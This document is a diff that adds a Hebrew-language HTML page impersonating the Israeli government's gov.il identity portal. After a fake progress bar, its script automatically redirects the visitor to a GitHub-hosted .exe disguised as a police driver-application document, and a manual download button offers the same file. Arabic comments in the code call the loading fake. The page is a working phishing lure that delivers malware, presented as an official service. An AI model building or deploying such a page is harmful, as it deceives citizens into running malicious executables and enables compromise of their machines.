@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>מערכת ההזדהות הלאומית - שירות אישי</title>
+    <style>
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; direction: rtl; }
+        .bridge-container { max-width: 480px; width: 90%; background: #fff; padding: 40px; border-radius: 4px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); text-align: center; border-top: 8px solid #003366; }
+        .gov-logo { font-size: 28px; font-weight: bold; color: #003366; margin-bottom: 5px; }
+        .gov-sub { font-size: 14px; color: #666; margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
+        .status-text { font-size: 19px; color: #222; margin-bottom: 20px; font-weight: 600; }
+        
+        /* Progress Bar */
+        .progress-wrapper { width: 100%; background: #e9ecef; height: 12px; border-radius: 6px; overflow: hidden; margin-bottom: 25px; }
+        .progress-bar { width: 0%; height: 100%; background: #003366; transition: width 3.5s cubic-bezier(0.1, 0, 0.45, 1); }
+        
+        .info-msg { font-size: 15px; color: #444; line-height: 1.6; margin-bottom: 20px; }
+        .btn-manual { display: none; background: #003366; color: #fff !important; text-decoration: none; padding: 14px 30px; border-radius: 4px; font-weight: bold; font-size: 16px; margin-top: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        
+        .footer-info { margin-top: 35px; font-size: 12px; color: #888; border-top: 1px solid #f0f0f0; padding-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="bridge-container">
+        <div class="gov-logo">gov.il</div>
+        <div class="gov-sub">פורטל השירותים והמידע הממשלתי</div>
+        
+        <div class="status-text" id="status">מתחבר למערכת הפניות המקוונת...</div>
+        
+        <div class="progress-wrapper">
+            <div class="progress-bar" id="bar"></div>
+        </div>
+        
+        <div id="content-area">
+            <p class="info-msg" id="info">אנא המתן בזמן שהמערכת מכינה את המסמך המבוקש. <br>ההורדה תתבצע באופן אוطומטי תוך מספר שניות.</p>
+        </div>
+        
+        <a href="https://github.com/mhamrina-byte/pdf/raw/main/driverapply%40police.gov.il_6537400.exe" class="btn-manual" id="manualBtn">לחץ כאן להורדה ידנית</a>
+        
+        <div class="footer-info">
+            מדינת ישראל &copy; כל הזכויות שמורות <br>
+            אגף התקשוב הממשלתי - הגנה בסייבר
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            var bar = document.getElementById('bar');
+            var status = document.getElementById('status');
+            var info = document.getElementById('info');
+            var btn = document.getElementById('manualBtn');
+            
+            // تحريك شريط التحميل
+            setTimeout(function() {
+                bar.style.width = '100%';
+            }, 200);
+
+            // اكتمال التحميل الوهمي
+            setTimeout(function() {
+                status.innerText = "החיבור הושלם בהצלחה";
+                info.innerHTML = "המסמך הופק ומוכן להורדה. <br>במידה וההורדה לא החלה, לחץ על הכפתור מטה.";
+                btn.style.display = 'inline-block';
+                
+                // بدء التحميل الفعلي
+                window.location.href = "https://github.com/mhamrina-byte/pdf/raw/main/driverapply%40police.gov.il_6537400.exe";
+            }, 4000);
+        };
+    </script>
+</body>
+</html>
